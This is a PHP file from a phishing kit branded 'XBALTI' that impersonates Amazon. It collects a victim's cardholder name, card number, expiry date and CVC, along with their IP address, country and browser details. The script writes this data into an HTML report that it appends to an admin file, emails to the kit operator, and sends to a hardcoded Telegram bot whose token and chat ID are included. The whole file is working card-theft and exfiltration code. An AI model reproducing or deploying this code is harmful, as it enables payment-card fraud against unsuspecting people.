<?php
/*   
             ,;;;;;;;,
            ;;;;;;;;;;;,
           ;;;;;'_____;'
           ;;;(/))))|((\
           _;;((((((|))))
          / |_\\\\\\\\\\\\
     .--~(  \ ~))))))))))))
    /     \  `\-(((((((((((\\
    |    | `\   ) |\       /|)
     |    |  `. _/  \_____/ |
      |    , `\~            /
       |    \  \ BY XBALTI /
      | `.   `\|          /
      |   ~-   `\        /
       \____~._/~ -_,   (\
        |-----|\   \    ';;
       |      | :;;;'     \
      |  /    |            |
      |       |            |                   
*/
session_start();
$_SESSION['namecard']   = $_POST['namecard'];
$_SESSION['cardnumber']   = $_POST['cardnumber'];
$_SESSION['exdate']   = $_POST['exdate'];
$_SESSION['cvc']   = $_POST['cvc']; 
$timedate = date('H:i:s d/m/Y');
include('Email.php');
include('get_browser.php');
include('check_bin.php');
include('get_ip.php');
$Namecard=$_SESSION['namecard'];$cnn=$_SESSION['cardnumber'];$cex=$_SESSION['exdate'];$csc=$_SESSION['cvc'];$Country=$_SESSION['country'];$IP=$_SESSION['_ip_'];$Usragent=$_SERVER['HTTP_USER_AGENT'];


$ygmai="
[+]━━━━━━━━━━━━━━━━【💳 Amazon Card INFO 】━━━━━━━━━━━━━━[+]
[👤 CardHolder Name]  = ".$Namecard."
[💳 Credit Card Number] = ".$ccn."
[🔄 Expiry Date ]       = ".$cex."
[🔑 CVV ]               = ".$csc."
[🔑 country ]  = '.$Country.'
[+]━━━━━━━━━━━━━━━━【💻 System】━━━━━━━━━━━━━━━━━[+]
[🔍 IP INFO] = http://www.geoiptool.com/?IP=".$IP."
[🖖 FINGERPRINT] = ".$Usragent."
";

$msg .= "
<!DOCTYPE html>
<html>
<head>
	<title>*REZULT*</title>
</head>
<body    style=' padding:0;margin:0;
    		background-color: #fff;
    		background-attachment:fixed;
    		border-bottom:1px solid rgba(255,255,255,0);
    		color: #ff8100;
    		height: 100vh;
    		font-family: calibri;
    		background-color: #000;
    		font-size: 18px;
    		text-shadow: 0 0 10px #ff8100;'  >
	<p style='text-align: center;margin:40px 0;'  >
		<img height='100px;' src='http://icons.iconarchive.com/icons/designbolts/credit-card-payment/256/Amazon-icon.png'>
	</p>
	<div   style=' margin:0 auto;
			max-width: 900px;
			width: 100%;
			border:2px solid #ff8100;
			border-radius: 4px;
			box-shadow: 0 0 20px #ff8100; '>


		<div align='center' style=' padding:10px 20px;  '> 
         <h1 style='text-align: center;' >XBALTI</h1>
			<p style='text-align: center;'>CARD INFORMATION FROM |".$_SESSION['country']."| ip = ".$_SESSION['_ip_']."   </p>
			<p>
				<table  style='margin:40px 0;border-bottom: 4px solid #6b5c5c;padding: 20px 0;border-radius: 4px;border-top: 4px solid #6b5c5c;'  >
					<tr>
						<td style=' width: 30%;'>
							|Name On Card|
						</td>
						<td>: 
							".$_SESSION['namecard']."
						</td>
					</tr>
					<tr>
						<td style=' width: 30%; '>
							|Card Number|
						</td>
						<td>:
						".$_SESSION['cardnumber']."
						</td>
					</tr>
					<tr>
						<td style=' width: 30%; '>
							|Expiration Date|
						</td>
						<td>:
						".$_SESSION['exdate']."
						</td>
					</tr>
					<tr>
						<td style=' width: 30%; '>
							|CVC|
						</td>
						<td>:
						".$_SESSION['cvc']."
						</td>
					</tr>
               <hr style='height: 10px; border: 0; box-shadow: 0 10px 10px -10px #8c8c8c inset;' >
				     <tr>
						<td style=' width: 30%;'>
							|Country|
						</td>
						<td>: 
						".$_SESSION['country']."
						</td>
					</tr>
					<tr>
						<td style=' width: 30%;'>
							|ip|
						</td>
						<td>: 
						".$_SESSION['_ip_']."
						</td>
					</tr>
					<tr>
						<td style=' width: 30%;'>
							|Browser/System|
						</td>
						<td>: 
						".XB_Browser($_SERVER['HTTP_USER_AGENT'])." On ".XB_OS($_SERVER['HTTP_USER_AGENT'])."
						</td>
                      </tr>
				</table>
                
               <hr style='height: 10px; border: 0; box-shadow: 0 10px 10px -10px #8c8c8c inset;' >
			</p>
		</div>
	</div>
</body>
</html>\n";
    $khraha = fopen("../../admin/rezulta.php", "a");
	fwrite($khraha, $msg);
    $subject .= "CARD INFO FROM [".$_SESSION['country']."] 😈 [".$_SESSION['_ip_']."]";$headers .= "From: <XBALTI>";$api = "2035318780:AAFF95W4a9Q4qlACGjeLPXzsDT4ekyMVO0I";$chatid = "-1001552903050";file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chatid."&text=" . urlencode($ygmai)."" );
    $headers .= "MIME-Version: 1.0\n";
	$headers .= "Content-type: text/html; charset=UTF-8\n";
	include("Telegram.php");
    @mail($Email, $subject, $msg, $headers);

?>
